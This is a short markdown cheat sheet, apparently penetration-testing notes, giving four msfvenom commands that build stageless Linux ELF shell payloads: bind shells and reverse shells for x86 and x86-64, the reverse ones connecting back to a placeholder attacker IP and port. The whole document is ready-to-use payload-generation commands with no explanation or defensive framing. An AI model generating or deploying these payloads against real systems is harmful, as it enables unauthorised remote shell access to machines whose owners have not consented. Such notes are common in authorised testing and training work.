# Stageless

## 01 - Bind Shells

1. x86 (32-bit) Payloads

```
$ msfvenom -p linux/x86/shell_bind_tcp lport=<PORT> -f elf -o shell-x86
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p linux/x64/shell_bind_tcp lport=<PORT> -f elf -o shell-x86-64
```

## 02 - Reverse Shells

1. x86 (32-bit) Payloads

```
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x86
```

2. x86-64 (64-bit) Payloads

```
$ msfvenom -p linux/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x64
```